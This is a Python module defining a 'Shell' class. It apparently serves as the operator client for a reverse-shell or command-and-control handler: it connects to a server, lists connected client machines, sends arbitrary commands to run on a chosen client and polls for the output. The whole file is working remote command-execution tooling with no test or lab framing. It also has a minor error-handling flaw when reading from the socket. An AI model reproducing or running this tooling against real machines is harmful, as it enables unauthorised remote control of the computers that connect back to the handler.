#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.

import socket
import time
import logging

logger = logging.getLogger(__name__)

class Shell:
    def __init__(self, ip, port):
        logger.debug("Initialized shell communication object")
        self.MAX_RECV = 4098
        self.ip = ip
        self.port = port

        self.client_ip = None
        self.client_port = None

    def set_client(self, ip, port):
        assert isinstance(ip, str) and isinstance(port, int)
        self.client_ip = ip
        self.client_port = port

    def receive_socket(self, s):
        ret = ""
        while True:
            try:
                resp = s.recv(self.MAX_RECV)
            except OSError as e:
                logger.warning("Socket receive error: {}".format(e))

            if len(resp) != 0:
                ret += resp.decode("utf-8")
                if len(resp) < self.MAX_RECV:
                    break
        return ret

    def send(self, packet, recv=True):
        assert isinstance(packet, str)
        packet += "\n"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))
        s.send(packet.encode())

        if recv is True:
            ret = self.receive_socket(s)
        else:
            return b""

        return ret

    def get_data(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))
        packet = "get${}${}".format(self.client_ip, self.client_port)
        s.send(packet.encode())

        ret = self.receive_socket(s)
        return ret

    def exec(self, cmd):
        assert isinstance(cmd, str)
        if self.client_ip is None or self.client_port is None:
            return b"Client not set"
        packet = "exec${}${}${}".format(self.client_ip, self.client_port, cmd)

        resp = self.send(packet).strip("\n")

        # If response is an error, we return that instead of command output
        if resp != "OK":
            return resp

        for i in range(0, 10):
            response = self.get_data().strip()
            if response != None and response != "":
                return response
            elif response is None:
                return ""
            else:
                time.sleep(0.5)
        return ""

    def clients(self):
        resp = self.send("list")

        ret = []
        lines = resp.strip("\n").split("\n")
        if lines[0] != "ip,port":
            return resp
        else:
            lines = lines[1:]
        for line in lines:
            try:
                (ip, port) = line.split("$")
                port = int(port)
            except:

                return resp
            ret.append({"ip": ip, "port": port})

        return ret

    def exit(self):
        self.send("exit", False)
